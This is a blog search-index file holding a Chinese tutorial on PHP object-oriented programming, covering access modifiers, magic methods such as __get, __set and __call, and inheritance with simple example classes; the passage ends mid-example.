<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>详解PHP中的面向对象（中）</title>
      <link href="/posts/a8b7bd45.html"/>
      <url>/posts/a8b7bd45.html</url>
      
        <content type="html"><![CDATA[<h2 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h2><p>使用修饰符修饰成员属性和成员方法,最大限度的隐藏对象的内部细节,保证对象的完整性和安全性</p><h4 id="public-公有的"><a href="#public-公有的" class="headerlink" title="public  公有的"></a>public  公有的</h4><p>类的成员属性和成员方法, 可以在类的 <strong>外部</strong> 读取和调用.</p><p>如果成员方法前没有任何修饰符, 则默认为 public</p><p>对象把变量和函数用大括号装在一起</p><p>即 对象 = {成员属性+成员方法} = {变量 + 函数}</p><p>强调的是一个整体性.</p><p><strong>对象内部, 成员方法可以直接访问成员属性. 因此,方法之间传递数据非常方便.</strong> </p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>     <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token comment" spellcheck="true">// 直接给成员属性赋值 </span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$str</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token comment" spellcheck="true">// 直接访问成员属性 </span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="private-私有的"><a href="#private-私有的" class="headerlink" title="private   私有的"></a>private   私有的</h4><p>类的成员属性和成员方法, 只能在类的 <strong>内部</strong> 读取和调用.</p><p><strong>对象中的有些成员属性和方法, 不应该直接被外部访问( 把 public 换成 private ).</strong></p><p>1) 想要知道女生的名字, 不能直接拿人家身份证, 需要向她请求询问.</p><p>​    女生回答(对象的成员方法), 其结果(返回值), 可以是真实姓名, 可以是假名字, 也可以拒绝告诉.</p><p>2) 借给朋友钱, 不应该把银行卡和密码给对方, 让对方自已去取.</p><p>​    而是应该隐藏细节, 只是把最终的钱借给他.</p><p>3) 对象成员属性有合理的取值范围, 比如年龄. 如果外部直接赋值, 可能是1000岁 这样不合理的值.</p><p>​    由对象自己提供专门的成员方法来设置,获取年龄.方法中进行必要的范围检查. 从而保证合理性. </p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">// 问女孩名称 </span><span class="token keyword">class</span> <span class="token class-name">Girl</span> <span class="token punctuation">{</span>     <span class="token keyword">private</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string">'翠花'</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 改用 private , 禁止外部直接访问</span>    <span class="token comment" spellcheck="true">// 由对象自身方法返回结果. </span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getName</span><span class="token punctuation">(</span> <span class="token variable">$str</span> <span class="token punctuation">)</span>     <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$str</span><span class="token operator">==</span><span class="token string">'警察'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>             <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$str</span><span class="token operator">==</span><span class="token string">'油腻大叔'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>             <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token string">'小仙女'</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>     <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">// 借钱给朋友 </span><span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">{</span>     <span class="token keyword">private</span> <span class="token variable">$card</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 银行卡 </span>    <span class="token keyword">private</span> <span class="token variable">$password</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 密码 </span>    <span class="token keyword">private</span> <span class="token variable">$money</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 身上的现金 </span>    <span class="token comment" spellcheck="true">// 取钱 </span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">qu_qian</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span> money <span class="token operator">=</span> 银行<span class="token operator">-</span><span class="token operator">></span><span class="token function">atm</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">card</span><span class="token punctuation">,</span> <span class="token variable">$thid</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 借给别人钱 </span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">gei</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">qu_qian</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 取钱是对象自己完成的, 不需要别人知道, 所以也是私有. </span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">money</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有些成员只是被其它成员访问使用, 不需要被外部知道, 那就加上 private .</p><p>在使用一个类对象时, 我们只需要关心它的public的, 可以被外部访问的成员. </p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">{</span>     <span class="token keyword">private</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$sex</span><span class="token punctuation">;</span>     <span class="token keyword">private</span> <span class="token variable">$age</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token variable">$n</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$n</span><span class="token operator">>=</span><span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$n</span><span class="token operator">&lt;</span><span class="token number">120</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>             <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token variable">$n</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>             <span class="token keyword">echo</span> <span class="token string">'设置年龄不在合理范围内!'</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="protected-受保护的"><a href="#protected-受保护的" class="headerlink" title="protected 受保护的"></a>protected 受保护的</h4><p>​    受保护的成员属性在类的外部    不能直接访问</p><p>​    受保护的成员方法在类的外部    不能直接调用</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">{</span>     <span class="token keyword">protected</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$sex</span><span class="token punctuation">;</span>     <span class="token keyword">protected</span> <span class="token variable">$age</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token variable">$n</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$n</span><span class="token operator">>=</span><span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$n</span><span class="token operator">&lt;</span><span class="token number">120</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>             <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token variable">$n</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>             <span class="token keyword">echo</span> <span class="token string">'设置年龄不在合理范围内!'</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h4><p><strong>__get</strong> 获取对象中的<strong>非公有或不存在</strong>的成员属性时, 触发该方法   接受一个参数  属性名</p><p><strong>__set</strong> 设置对象中的<strong>非公有或不存在</strong>的成员属性时, 触发该方法   接受两个参数 (属性名,属性值)</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>     <span class="token keyword">private</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string">'景水'</span><span class="token punctuation">;</span>     <span class="token keyword">private</span> <span class="token variable">$sex</span> <span class="token operator">=</span> <span class="token string">'男'</span><span class="token punctuation">;</span>     <span class="token keyword">private</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token number">18</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// $prop 为要获取的属性名称 </span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$prop</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$prop</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// $prop 为要设置的属性名称, $value 为要设置的具体值 </span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__set</span><span class="token punctuation">(</span><span class="token variable">$prop</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$prop</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token variable">$obj</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// 触发 __get() </span><span class="token variable">$obj</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">sex</span> <span class="token operator">=</span> <span class="token string">'女'</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// 触发 __set() </span><span class="token comment" spellcheck="true">/*     这两个方法代替了多个 getXXX 和 setXXX 方法     从使用类的角度, 不需要知道 getXXX 和 setXXX 方法,     只是把成员属性当做public来使用即可, __get 和 __set 会自然的,    透明的起到 保护对象的目的. */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>__call()</strong> 调用对象中<strong>非公有或不存在</strong>的成员方法时, 触发该方法      接受两个参数 (函数名,参数列表)</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 私有方法,不能在外部直接调用 </span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$a</span> <span class="token operator">+</span> <span class="token variable">$b</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// $method 为要调用的方法名, $params 为调用方法时的参数数组 </span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token variable">$params</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$method</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token variable">$params</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token variable">$obj</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// 触发 __call() 返回 7 </span><span class="token comment" spellcheck="true">/*     有一种场景,可以利用__call在 原方法执行前,执行后添加代码.    如:     public function __call($method, $params)     {         // 前置代码 $this->$method(...$params); // 后置代码     } */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>其它魔术方法</strong></p><p><strong>__isset</strong> 判断对象的<strong>非公有或不存在</strong>的属性时, 触发该方法        接受一个参数  属性名</p><p><strong>__unset</strong> 销毁对象的<strong>非公有或不存在</strong>的属性时, 触发该方法      接受一个参数  属性名</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>     <span class="token keyword">private</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string">'景水'</span><span class="token punctuation">;</span>     <span class="token keyword">private</span> <span class="token variable">$sex</span> <span class="token operator">=</span> <span class="token string">'男'</span><span class="token punctuation">;</span>     <span class="token keyword">private</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token number">18</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// 返回真实的结果 $prop 要判断的属性名 </span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__isset</span><span class="token punctuation">(</span><span class="token variable">$prop</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token keyword">return</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$prop</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 实现销毁私有属性 $prop 要销毁的属性 </span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__unset</span><span class="token punctuation">(</span><span class="token variable">$prop</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$prop</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 触发 __isset() </span><span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">sex</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 触发 __unset()</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>__clone</strong> 当对象被克隆时,触发该方法</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>     <span class="token keyword">private</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string">'wangjs'</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> name <span class="token operator">=</span> <span class="token string">'上神'</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token variable">$obj1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">;</span> <span class="token variable">$obj2</span> <span class="token operator">=</span> clone <span class="token variable">$obj1</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 触发 __clone</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>__invoke</strong> 当对象被当做函数调用时, 触发该方法</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>     <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token keyword">echo</span> <span class="token string">'你把我当成函数调用啦!'</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">;</span> <span class="token variable">$obj</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// 触发 __invoke(), 可以用参数</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>__toString</strong>   当在脚本中直接对对象进行字符串操作的时候 触发该方法</p><p>作用: 代替对象进行字符串的操作</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">class</span> <span class="token class-name">A</span>    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token number">100</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//在方法中必须要返回一个字符串类型的值</span>            <span class="token keyword">return</span> <span class="token string">'100'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p>就是别人有 但是我没有  这个时候需要使用继承 把它所有的东西都拿过来 </p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//基本格式</span><span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token punctuation">{</span>     <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token string">'王建双'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'水清则无鱼'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token comment" spellcheck="true">// B类具有A类所有的成员. B类为子类, A类为父类</span><span class="token keyword">class</span> <span class="token class-name">B</span> <span class="token keyword">extends</span> <span class="token class-name">A</span>  <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 这里面什么都不写, 也已经有A中的成员属性和成员方法</span>    <span class="token comment" spellcheck="true">// 添加 成员属性 和 成员方法</span>    <span class="token keyword">public</span> <span class="token variable">$sex</span> <span class="token operator">=</span> <span class="token string">'男'</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">listen</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'认真听讲,不睡觉!&lt;br>'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 访问从父类继承的成员 </span><span class="token keyword">echo</span> <span class="token variable">$b</span> <span class="token operator">-</span><span class="token operator">></span> name<span class="token punctuation">,</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span> <span class="token variable">$b</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 访问父类独有的成员 </span><span class="token keyword">echo</span> <span class="token variable">$b</span> <span class="token operator">-</span><span class="token operator">></span> sex<span class="token punctuation">,</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span> <span class="token variable">$b</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">listen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/*注意:    1)  B 中还可以 添加 新的成员属性和方法    2)  B 中还可以 重写 已有的成员方法.    重写成员方法的时候, 参数个数要一致, 构造方法可以不一致*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>父类中的 <code>私有成员( private )</code>  在子类中无法访问.</strong></p><p><strong>父类中的 <code>受保护的 ( protected )</code> 修饰成员,  使成员在子类中也可以访问.</strong></p><table><thead><tr><th align="center"></th><th align="center">本类</th><th align="center">子类</th><th align="center">类的外部</th></tr></thead><tbody><tr><td align="center"><strong>public</strong></td><td align="center">Y</td><td align="center">Y</td><td align="center">Y</td></tr><tr><td align="center"><strong>private</strong></td><td align="center">Y</td><td align="center">N</td><td align="center">N</td></tr><tr><td align="center"><strong>protected</strong></td><td align="center">Y</td><td align="center">Y</td><td align="center">N</td></tr></tbody></table><h4 id="单继承"><a href="#单继承" class="headerlink" title="单继承"></a>单继承</h4><p>在php中只支持单继承</p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">// 父类 --- 人 </span><span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">{</span>     <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token variable">$sex</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 学生类 继承 人类 </span><span class="token keyword">class</span> <span class="token class-name">Student</span> <span class="token keyword">extends</span> <span class="token class-name">Person</span> <span class="token punctuation">{</span>     <span class="token keyword">public</span> <span class="token variable">$num</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 教师类 继承 人类 </span><span class="token keyword">class</span> <span class="token class-name">Teacher</span> <span class="token keyword">extends</span> <span class="token class-name">Person</span> <span class="token punctuation">{</span>     <span class="token keyword">public</span> <span class="token variable">$money</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">teach</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token comment" spellcheck="true">/*    单继承是一次只能继承一个类,不能连续继承多个类*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="子类的重载"><a href="#子类的重载" class="headerlink" title="子类的重载"></a>子类的重载</h4><p>1.如果子类对父类的方法进行重写之后,实例化的对象在调用该方法的时候,会调用子类方法.</p><p>2.如果在子类的方法中想调用父类中的同名方法,这个需要使用  <strong><code>parent::方法名()</code></strong></p><p>3.子类中重写成员方法的时候,要求参数个数和类型要一致,但是构造方法可以不一致</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token keyword">return</span> <span class="token variable">$a</span> <span class="token operator">+</span> <span class="token variable">$b</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">B</span> <span class="token keyword">extends</span> <span class="token class-name">A</span> <span class="token punctuation">{</span>     <span class="token keyword">public</span> <span 